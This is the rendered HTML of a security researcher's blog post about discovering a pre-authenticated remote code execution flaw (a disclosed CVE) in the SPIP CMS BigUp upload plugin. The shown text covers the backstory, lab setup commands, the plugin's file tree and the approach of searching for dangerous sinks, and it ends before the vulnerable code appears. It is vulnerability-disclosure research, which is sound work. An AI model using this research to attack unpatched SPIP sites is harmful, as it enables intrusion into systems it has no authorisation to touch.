@@ -1,0 +1,1601 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-us" lang="en-us">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    
+
+
+
+
+
+
+
+
+
+
+    
+
+
+
+
+
+
+
+<script defer language="javascript" type="text/javascript" src="/js/bundle.min.145453261a7755f5042a854c4213501d215a8fbe34c08d181c40f803f1315e74.js"></script>
+
+
+
+
+
+
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    
+    <link rel="icon" href=/images/favicon.png>
+
+    
+    
+
+
+
+
+
+  
+
+
+
+
+
+  
+  
+  
+
+
+<!-- Open Graph image and Twitter Card metadata -->
+
+<title itemprop="name">Vozec&#39;s Blog - Spip Preauth RCE 2024, my First CVE !</title>
+<meta property="og:title" content=Vozec&#39;s&#32;Blog&#32;-&#32;Spip&#32;Preauth&#32;RCE&#32;2024,&#32;my&#32;First&#32;CVE&#32;! />
+<meta name="twitter:title" content=Vozec&#39;s&#32;Blog&#32;-&#32;Spip&#32;Preauth&#32;RCE&#32;2024,&#32;my&#32;First&#32;CVE&#32;! />
+<meta itemprop="name" content=Vozec&#39;s&#32;Blog&#32;-&#32;Spip&#32;Preauth&#32;RCE&#32;2024,&#32;my&#32;First&#32;CVE&#32;! />
+<meta name="application-name" content=Vozec&#39;s&#32;Blog&#32;-&#32;Spip&#32;Preauth&#32;RCE&#32;2024,&#32;my&#32;First&#32;CVE&#32;! />
+<meta property="og:site_name" content="" />
+
+
+<meta name="description" content="Here&#39;s an article describing the discovery of my first CVE in collaboration with @TheLaluka! A PreAuthenticated RCE on Spip CMS version &lt;= 3.4.1 ." />
+<meta itemprop="description" content="Here&#39;s an article describing the discovery of my first CVE in collaboration with @TheLaluka! A PreAuthenticated RCE on Spip CMS version &lt;= 3.4.1 ." />
+<meta property="og:description" content="Here&#39;s an article describing the discovery of my first CVE in collaboration with @TheLaluka! A PreAuthenticated RCE on Spip CMS version &lt;= 3.4.1 ." />
+<meta name="twitter:description" content="Here&#39;s an article describing the discovery of my first CVE in collaboration with @TheLaluka! A PreAuthenticated RCE on Spip CMS version &lt;= 3.4.1 ." />
+
+
+<base href="//localhost:1313/researchs/spip-preauth-rce-2024-big-upload/" />
+<link rel="canonical" href="//localhost:1313/researchs/spip-preauth-rce-2024-big-upload/" itemprop="url" />
+<meta name="url" content="//localhost:1313/researchs/spip-preauth-rce-2024-big-upload/" />
+<meta name="twitter:url" content="//localhost:1313/researchs/spip-preauth-rce-2024-big-upload/" />
+<meta property="og:url" content="//localhost:1313/researchs/spip-preauth-rce-2024-big-upload/" />
+
+
+<meta property="og:updated_time" content="2024-09-04T00:00:00Z" />
+
+
+<link rel="sitemap" type="application/xml" title="Sitemap" href='//localhost:1313/sitemap.xml' />
+
+<meta name="robots" content="index,follow" />
+<meta name="googlebot" content="index,follow" />
+
+
+<meta name="twitter:site" content="https://twitter.com/Vozec1" />
+<meta name="twitter:creator" content="https://twitter.com/Vozec1" />
+<meta property="fb:admins" content="" />
+
+
+<meta name="apple-mobile-web-app-title" content="" />
+<meta name="apple-mobile-web-app-capable" content="yes" />
+<meta name="apple-mobile-web-app-status-bar-style" content="black" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.134.1">
+
+
+    
+    
+
+<link type="text/css" rel="stylesheet" href="/css/bundle.min.94a339836f89f0d25f31980cb6b0631da21e20af128308747ce44e0525eb16ef.css">
+
+
+    
+    <style>
+    body {
+        --sidebar-bg-color: #202020;
+        --sidebar-img-border-color: #515151;
+        --sidebar-p-color: #909090;
+        --sidebar-h1-color: #FFF;
+        --sidebar-a-color: #FFF;
+        --sidebar-socials-color: #FFF;
+        --text-color: #222;
+        --bkg-color: #FAF9F6;
+        --post-title-color: #303030;
+        --list-color: #5A5A5A;
+        --link-color: #268BD2;
+        --date-color: #515151;
+        --table-border-color: #E5E5E5;
+        --table-stripe-color: #F9F9F9;
+        --code-color: #000;
+        --code-background-color: #E5E5E5;
+        --code-block-color: #FFF;
+        --code-block-background-color: #272822;
+        --moon-sun-color: #FFF;
+        --moon-sun-background-color: #515151;
+    }
+    body.dark-theme {
+        --text-color: #EEE;
+        --bkg-color: #121212;
+        --post-title-color: #DBE2E9;
+        --list-color: #9D9D9D;
+        --link-color: #268BD2;
+        --date-color: #9A9A9A;
+        --table-border-color: #515151;
+        --table-stripe-color: #202020;
+        --code-color: #FFF;
+        --code-background-color: #515151;
+        --code-block-color: #FFF;
+        --code-block-background-color: #272822;
+    }
+    body {
+        background-color: var(--bkg-color);
+    }
+</style>
+
+</head>
+
+    <body class="dark-theme">
+        <div class="wrapper">
+            <aside class="sidebar">
+    <div class="container sidebar-sticky">
+        <div class="light-dark" align="right">
+    <button class="btn-light-dark" title="Toggle light/dark mode">
+        <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
+            <path fill="currentColor" d="M6 .278a.768.768 0 0 1 .08.858a7.208 7.208 0 0 0-.878 3.46c0 4.021 3.278 7.277 7.318 7.277c.527 0 1.04-.055 1.533-.16a.787.787 0 0 1 .81.316a.733.733 0 0 1-.031.893A8.349 8.349 0 0 1 8.344 16C3.734 16 0 12.286 0 7.71C0 4.266 2.114 1.312 5.124.06A.752.752 0 0 1 6 .278z"/>
+        </svg>
+        <svg class="sun" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
+            <path fill="currentColor" d="M8 12a4 4 0 1 0 0-8a4 4 0 0 0 0 8zM8 0a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 0zm0 13a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 13zm8-5a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2a.5.5 0 0 1 .5.5zM3 8a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2A.5.5 0 0 1 3 8zm10.657-5.657a.5.5 0 0 1 0 .707l-1.414 1.415a.5.5 0 1 1-.707-.708l1.414-1.414a.5.5 0 0 1 .707 0zm-9.193 9.193a.5.5 0 0 1 0 .707L3.05 13.657a.5.5 0 0 1-.707-.707l1.414-1.414a.5.5 0 0 1 .707 0zm9.193 2.121a.5.5 0 0 1-.707 0l-1.414-1.414a.5.5 0 0 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .707zM4.464 4.465a.5.5 0 0 1-.707 0L2.343 3.05a.5.5 0 1 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .708z"/>
+        </svg>
+    </button>
+</div>
+
+        <div class="sidebar-about">
+    <h1 class="brand">
+        
+            <a href="//localhost:1313/">
+                <img src="https://avatars.githubusercontent.com/u/61807609?v=4" alt="brand image">
+            </a>
+        
+        
+            <a href="//localhost:1313/">
+                <h1>Vozec&#39;s Blog</h1>
+            </a>
+        
+    </h1>
+    <p class="lead">
+    A student passionate about cybersecurity
+    </p>
+</div>
+
+        <nav>
+    <ul class="sidebar-nav">
+
+        
+        
+        
+        
+            
+
+            
+                
+                
+                    <li class="heading">
+                        <a href="/about/">About</a>
+                    </li>
+                    
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+        
+            
+
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+                    <li class="heading">
+                        <a href="/writeups/">Writeups</a>
+                    </li>
+                    
+                
+            
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+        
+            
+
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+                    <li class="heading">
+                        <a href="/researchs/">Researchs</a>
+                    </li>
+                    
+                
+            
+                
+                
+            
+                
+                
+            
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+        
+            
+
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+                    <li class="heading">
+                        <a href="/rsa/">1/ Crypto RSA</a>
+                    </li>
+                    
+                
+            
+                
+                
+            
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+        
+            
+
+            
+                
+                
+            
+                
+                
+                    <li class="heading">
+                        <a href="/aes/">2/ Crypto AES</a>
+                    </li>
+                    
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+        
+            
+
+            
+                
+                
+            
+                
+                
+            
+                
+                
+                    <li class="heading">
+                        <a href="/other/">3/ Crypto Other</a>
+                    </li>
+                    
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+
+    </ul>
+</nav>
+
+        
+    <a target="_blank" class="social" title="GitHub" href="https://github.com/Vozec">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="-2 -2 24 24">
+            <path fill="currentColor" d="M18.88 1.099C18.147.366 17.265 0 16.233 0H3.746C2.714 0 1.832.366 1.099 1.099C.366 1.832 0 2.714 0 3.746v12.487c0 1.032.366 1.914 1.099 2.647c.733.733 1.615 1.099 2.647 1.099H6.66c.19 0 .333-.007.429-.02a.504.504 0 0 0 .286-.169c.095-.1.143-.245.143-.435l-.007-.885c-.004-.564-.006-1.01-.006-1.34l-.3.052c-.19.035-.43.05-.721.046a5.555 5.555 0 0 1-.904-.091a2.026 2.026 0 0 1-.872-.39a1.651 1.651 0 0 1-.572-.8l-.13-.3a3.25 3.25 0 0 0-.41-.663c-.186-.243-.375-.407-.566-.494l-.09-.065a.956.956 0 0 1-.17-.156a.723.723 0 0 1-.117-.182c-.026-.061-.004-.111.065-.15c.07-.04.195-.059.378-.059l.26.04c.173.034.388.138.643.311a2.1 2.1 0 0 1 .631.677c.2.355.44.626.722.813c.282.186.566.28.852.28c.286 0 .533-.022.742-.065a2.59 2.59 0 0 0 .585-.196c.078-.58.29-1.028.637-1.34a8.907 8.907 0 0 1-1.333-.234a5.314 5.314 0 0 1-1.223-.507a3.5 3.5 0 0 1-1.047-.872c-.277-.347-.505-.802-.683-1.365c-.177-.564-.266-1.215-.266-1.952c0-1.049.342-1.942 1.027-2.68c-.32-.788-.29-1.673.091-2.652c.252-.079.625-.02 1.119.175c.494.195.856.362 1.086.5c.23.14.414.257.553.352a9.233 9.233 0 0 1 2.497-.338c.859 0 1.691.113 2.498.338l.494-.312a6.997 6.997 0 0 1 1.197-.572c.46-.174.81-.221 1.054-.143c.39.98.424 1.864.103 2.653c.685.737 1.028 1.63 1.028 2.68c0 .737-.089 1.39-.267 1.957c-.177.568-.407 1.023-.689 1.366a3.65 3.65 0 0 1-1.053.865c-.42.234-.828.403-1.223.507a8.9 8.9 0 0 1-1.333.235c.45.39.676 1.005.676 1.846v3.11c0 .147.021.266.065.357a.36.36 0 0 0 .208.189c.096.034.18.056.254.064c.074.01.18.013.318.013h2.914c1.032 0 1.914-.366 2.647-1.099c.732-.732 1.099-1.615 1.099-2.647V3.746c0-1.032-.367-1.914-1.1-2.647z"/>
+        </svg>
+    </a>
+
+
+
+    <a target="_blank" class="social" title="LinkedIn" href="https://www.linkedin.com/in/arthur-dlfr/">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 448 512">
+            <path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5c0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7c-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5c67.2 0 79.7 44.3 79.7 101.9V416z"/>
+        </svg>
+    </a>
+
+
+    <a target="_blank" class="social" title="Twitter" href="https://twitter.com/Vozec1">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="0 0 16 16">
+            <path fill="currentColor" d="M5.032 14.286c6.037 0 9.34-4.837 9.34-9.032c0-.137 0-.274-.01-.41A6.56 6.56 0 0 0 16 3.2c-.6.256-1.235.425-1.885.5a3.207 3.207 0 0 0 1.443-1.757c-.645.37-1.35.63-2.085.77a3.322 3.322 0 0 0-1.862-.958a3.384 3.384 0 0 0-2.082.334a3.223 3.223 0 0 0-1.442 1.49a3.08 3.08 0 0 0-.208 2.03a9.57 9.57 0 0 1-3.747-.963a9.269 9.269 0 0 1-3.018-2.354a3.086 3.086 0 0 0-.36 2.314c.189.787.68 1.475 1.376 1.924a3.344 3.344 0 0 1-1.49-.398v.04c0 .734.263 1.444.743 2.01a3.3 3.3 0 0 0 1.89 1.102c-.483.128-.99.146-1.482.055a3.19 3.19 0 0 0 1.168 1.577a3.36 3.36 0 0 0 1.9.627A6.732 6.732 0 0 1 0 12.86a9.527 9.527 0 0 0 5.032 1.423"/>
+        </svg>
+    </a>
+
+
+
+
+    <a target="_blank" class="social" title="Discord" href="vozec">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="0 0 24 24">
+            <path fill="currentColor" d="M19.27 5.33C17.94 4.71 16.5 4.26 15 4a.09.09 0 0 0-.07.03c-.18.33-.39.76-.53 1.09a16.09 16.09 0 0 0-4.8 0c-.14-.34-.35-.76-.54-1.09c-.01-.02-.04-.03-.07-.03c-1.5.26-2.93.71-4.27 1.33c-.01 0-.02.01-.03.02c-2.72 4.07-3.47 8.03-3.1 11.95c0 .02.01.04.03.05c1.8 1.32 3.53 2.12 5.24 2.65c.03.01.06 0 .07-.02c.4-.55.76-1.13 1.07-1.74c.02-.04 0-.08-.04-.09c-.57-.22-1.11-.48-1.64-.78c-.04-.02-.04-.08-.01-.11c.11-.08.22-.17.33-.25c.02-.02.05-.02.07-.01c3.44 1.57 7.15 1.57 10.55 0c.02-.01.05-.01.07.01c.11.09.22.17.33.26c.04.03.04.09-.01.11c-.52.31-1.07.56-1.64.78c-.04.01-.05.06-.04.09c.32.61.68 1.19 1.07 1.74c.03.01.06.02.09.01c1.72-.53 3.45-1.33 5.25-2.65c.02-.01.03-.03.03-.05c.44-4.53-.73-8.46-3.1-11.95c-.01-.01-.02-.02-.04-.02zM8.52 14.91c-1.03 0-1.89-.95-1.89-2.12s.84-2.12 1.89-2.12c1.06 0 1.9.96 1.89 2.12c0 1.17-.84 2.12-1.89 2.12zm6.97 0c-1.03 0-1.89-.95-1.89-2.12s.84-2.12 1.89-2.12c1.06 0 1.9.96 1.89 2.12c0 1.17-.83 2.12-1.89 2.12z"/>
+        </svg>
+    </a>
+
+
+
+
+
+
+
+
+
+
+    <a target="_blank" class="social" title="Email" href="https://www.root-me.org/Vozec">
+       <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 485.211 485.211">
+            <path fill="currentColor" d="M301.393,241.631L464.866,424.56H20.332l163.474-182.928l58.801,51.443L301.393,241.631z M462.174,60.651H23.027 l219.579,192.142L462.174,60.651z M324.225,221.67l160.986,180.151V80.792L324.225,221.67z M0,80.792v321.029L160.972,221.64 L0,80.792z"/>
+       </svg>
+    </a>
+
+
+        <p class="footnote">
+powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a target="_blank" href="https://github.com/lukeorth/poison">poison</a>
+    <br>
+    &copy; 2024 . All rights reserved.
+</p>
+
+  </div>
+</aside>
+
+            <main class="content container">
+                <div class="post">
+  <div class="info">
+  <h1 class="post-title">
+    <a href="//localhost:1313/researchs/spip-preauth-rce-2024-big-upload/">Spip Preauth RCE 2024, my First CVE !</a>
+  </h1>
+
+  <div class="headline">
+    <div>
+      
+      <time datetime=" 2024-09-04T00:00:00Z" class="post-date">
+        September 4, 2024
+      </time>
+      
+      <span> - </span>
+      <span class="reading-time">
+        
+          
+        
+
+        <span>11 mins read</span>
+      </span>
+    </div>
+
+    
+  </div>
+
+  
+  
+
+  
+</div>
+
+  <h2 id="some-context">Some Context</h2>
+<p>A month ago, <a href="https://x.com/TheLaluka/" target="_blank">TheLaluka</a> <a href="https://x.com/TheLaluka/status/1821821709499961817" target="_blank">suggested</a> finding his preauth RCE in SPIP as a challenge.
+The challenge was very nice and I had nothing to do, so I decided to take a look at this CMS.</p>
+<p><img src="./img/tweet1.png" alt="tweet1"></p>
+<p>He gave us a hint to narrow down the attack surface, as the project is substantial.
+So, with <a href="https://x.com/_Worty" target="_blank">Worty</a>, we found the vulnerability and <a href="https://x.com/TheLaluka/status/1824357306433253480" target="_blank">won the challenge</a>!</p>
+<p><img src="./img/win.png" alt="win"></p>
+<p><em>Above is a screenshot from the <a href="https://x.com/_barbhack_" target="_blank"><em>barbhack</em></a> rump we gave to release the yet-another-spip-rce-challenge: the one we&rsquo;re disclosing today</em></p>
+<p>He sent us 2 bottles of arranged rums to congratulate us <em>(what a prince!)</em> and everything could have ended there, but I enjoyed the challenge and it gave me a vague idea of how Spip works. I still had several subtleties in mind and still had some free time, so I thought I&rsquo;d keep on looking for vulnerabilities.</p>
+<p><img src="./img/rhum.png" alt="rhum"></p>
+<p>So I&rsquo;m going to present what will lead to a new <code>RCE preauth on versions &lt;= 4.3.1</code> of this CMS:</p>
+<ul>
+<li><a href="https://blog.spip.net/Mise-a-jour-critique-de-securite-sortie-de-SPIP-4-3-2-SPIP-4-2-16-SPIP-4-1-18.html" target="_blank">blog.spip.net/Mise-a-jour-critique-de-securite-sortie-de-SPIP-4-3-2-SPIP-4-2-16-SPIP-4-1-18.html</a></li>
+<li><a href="https://www.cert.ssi.gouv.fr/avis/CERTFR-2024-AVI-0702" target="_blank">www.cert.ssi.gouv.fr/avis/CERTFR-2024-AVI-0702</a></li>
+</ul>
+<p>I found the CVE in an authenticated way, then reached out to Laluka to verify it wasn&rsquo;t already known. We then worked together to make it work without authentication, greatly increasing the impact!</p>
+<p>In the same way as his original post, we proposed a <a href="https://x.com/TheLaluka/status/1829929188381344007" target="_blank">new challenge during the Barbhack 2024</a> event to find the vulnerability.</p>
+<blockquote>
+<p>This time, the winners were <a href="https://x.com/GuilhemRioux" target="_blank">GuilhemRioux</a>, and the second solve from <a href="https://x.com/Chocapikk_" target="_blank">Chocapikk_</a>! The third solve wanted to stay anon, therefore respecting their choice! 😉</p>
+</blockquote>
+<h2 id="setup">Setup</h2>
+<p>The setup phase is quick, requiring only the CMS zip, an updated php and a few extensions such as <strong>php-xml</strong>, <strong>php-zip</strong> or <strong>php-sqlite3</strong>.<br>
+<strong>libsodium</strong> is also used for cryptography, and can be installed via the php extension manager <a href="https://pecl.php.net/" target="_blank">pecl</a>.</p>
+<p>For a quick installation, <strong>sqlite</strong> is very pleasant, as it allows a clean installation without having to deploy and rely on an external database.</p>
+<p>Here are the commands used:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mkdir spip3.4.1
+</span></span><span style="display:flex;"><span>cd spip3.4.1
+</span></span><span style="display:flex;"><span>wget https://files.spip.net/spip/archives/spip-v4.3.1.zip
+</span></span><span style="display:flex;"><span>unzip spip-v4.3.1.zip
+</span></span><span style="display:flex;"><span>apt update
+</span></span><span style="display:flex;"><span>pecl install -f libsodium
+</span></span><span style="display:flex;"><span>apt install -y php-xml php-zip php-sqlite3
+</span></span><span style="display:flex;"><span>php -S 0.0.0.0:8000
+</span></span></code></pre></div><p>The installation page can be found here: <a href="http://localhost:8000/spip.php?exec=install" target="_blank">http://localhost:8000/spip.php?exec=install</a></p>
+<p><img src="./img/spip_up.png" alt="spip_up"></p>
+<h2 id="code-review">Code review</h2>
+<p>I had two ways of looking for vulnerable code in the php codebase.
+The first was to trace my inputs on the various pages and see what code they triggered.
+The second was to send payloads everywhere and see what resulted.</p>
+<p>Both approaches are functional, especially on spip, which is notorious for evaluating just about anything in different places, &ldquo;for some reasons&rdquo;!</p>
+<p>I decided to be clever and look for vulnerable sinks in the code.
+The RCE for Laluka&rsquo;s 1st challenge was in the code of the <strong>“PortePlume”</strong> plugin, used to enhance Spip&rsquo;s native textbox. This plugin had already been audited, and although there was still a very promising RCE sink, I&rsquo;d gone over this plugin and wanted to discover some new code.
+So I naturally decided to audit other plugins installed by default.</p>
+<p>I started looking at the BigUp plugin code. It&rsquo;s a plugin used this time for file uploading. It&rsquo;s going to take care of saving the various uploaded images to disk, renaming them appropriately, handling big chunked uploads, and more.</p>
+<p>The plugin is quite substantial:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span>├── action
+</span></span><span style="display:flex;"><span>│   └── bigup.php
+</span></span><span style="display:flex;"><span>├── balise
+</span></span><span style="display:flex;"><span>│   └── saisie_fichier.php
+</span></span><span style="display:flex;"><span>├── bigup_administrations.php
+</span></span><span style="display:flex;"><span>├── bigup_fonctions.php
+</span></span><span style="display:flex;"><span>├── bigup_pipelines.php
+</span></span><span style="display:flex;"><span>├── CHANGELOG.md
+</span></span><span style="display:flex;"><span>├── composer.json
+</span></span><span style="display:flex;"><span>├── css
+</span></span><span style="display:flex;"><span>│   <span style="color:#f92672">[</span>.. SNIPPED ..<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>├── formulaires
+</span></span><span style="display:flex;"><span>│   ├── configurer_bigup.html
+</span></span><span style="display:flex;"><span>│   ├── tester_bigup_extended.html
+</span></span><span style="display:flex;"><span>│   ├── tester_bigup_extended.php
+</span></span><span style="display:flex;"><span>│   ├── tester_bigup.html
+</span></span><span style="display:flex;"><span>│   └── tester_bigup.php
+</span></span><span style="display:flex;"><span>├── genie
+</span></span><span style="display:flex;"><span>│   └── bigup_nettoyer_repertoire_upload.php
+</span></span><span style="display:flex;"><span>├── inc
+</span></span><span style="display:flex;"><span>│   ├── Bigup
+</span></span><span style="display:flex;"><span>│   │   ├── CacheFichiers.php
+</span></span><span style="display:flex;"><span>│   │   ├── Cache.php
+</span></span><span style="display:flex;"><span>│   │   ├── CacheRepertoire.php
+</span></span><span style="display:flex;"><span>│   │   ├── Files.php
+</span></span><span style="display:flex;"><span>│   │   ├── Flow.php
+</span></span><span style="display:flex;"><span>│   │   ├── Formulaire.php
+</span></span><span style="display:flex;"><span>│   │   ├── GestionRepertoires.php
+</span></span><span style="display:flex;"><span>│   │   ├── Identifier.php
+</span></span><span style="display:flex;"><span>│   │   ├── LogTrait.php
+</span></span><span style="display:flex;"><span>│   │   └── Repondre.php
+</span></span><span style="display:flex;"><span>│   └── Bigup.php
+</span></span><span style="display:flex;"><span>├── javascript
+</span></span><span style="display:flex;"><span>│   <span style="color:#f92672">[</span>.. SNIPPED ..<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>├── lang
+</span></span><span style="display:flex;"><span>│   ├── bigup_ar.php
+</span></span><span style="display:flex;"><span>│   ├── bigup_de.php
+</span></span><span style="display:flex;"><span>│   ├── bigup_en.php
+</span></span><span style="display:flex;"><span>│   ├── bigup_fr.php
+</span></span><span style="display:flex;"><span>│   ├── bigup_pt_br.php
+</span></span><span style="display:flex;"><span>│   ├── bigup.xml
+</span></span><span style="display:flex;"><span>│   ├── paquet-bigup_ar.php
+</span></span><span style="display:flex;"><span>│   ├── paquet-bigup_de.php
+</span></span><span style="display:flex;"><span>│   ├── paquet-bigup_en.php
+</span></span><span style="display:flex;"><span>│   ├── paquet-bigup_fr.php
+</span></span><span style="display:flex;"><span>│   ├── paquet-bigup_pt_br.php
+</span></span><span style="display:flex;"><span>│   └── paquet-bigup.xml
+</span></span><span style="display:flex;"><span>├── lib
+</span></span><span style="display:flex;"><span>│   <span style="color:#f92672">[</span>.. SNIPPED ..<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>├── paquet.xml
+</span></span><span style="display:flex;"><span>├── phpcs.xml.dist
+</span></span><span style="display:flex;"><span>├── phpstan-baseline.neon
+</span></span><span style="display:flex;"><span>├── phpstan.neon.dist
+</span></span><span style="display:flex;"><span>├── prive
+</span></span><span style="display:flex;"><span>│   <span style="color:#f92672">[</span>.. SNIPPED ..<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>├── README.md
+</span></span><span style="display:flex;"><span>├── saisies
+</span></span><span style="display:flex;"><span>│   <span style="color:#f92672">[</span>.. SNIPPED ..<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└── saisies-vues
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">[</span>.. SNIPPED ..<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>Instead of spending time reading all the code, I started by researching dangerous behavior via <a href="https://fr.wikipedia.org/wiki/Expression_r%C3%A9guli%C3%A8re" target="_blank">RegEx</a>.</p>
+<p>After several searches for dangerous functions: <code>eval</code>, <code>file_get_contents</code>, <code>system</code>&hellip; as well as <code>arbitrary object instantiation</code> such as <code>$a($b) )</code> I finally found a dubiously coded function! ☺️</p>
+<h2 id="the-vulnerable-function">The vulnerable function</h2>
+<p>In the <code>plugins-dist/bigup/inc/Bigup/Files.php</code> file, on line <em>230</em> the <em>extraire_fichiers_valides</em> function contains the following code:</p>
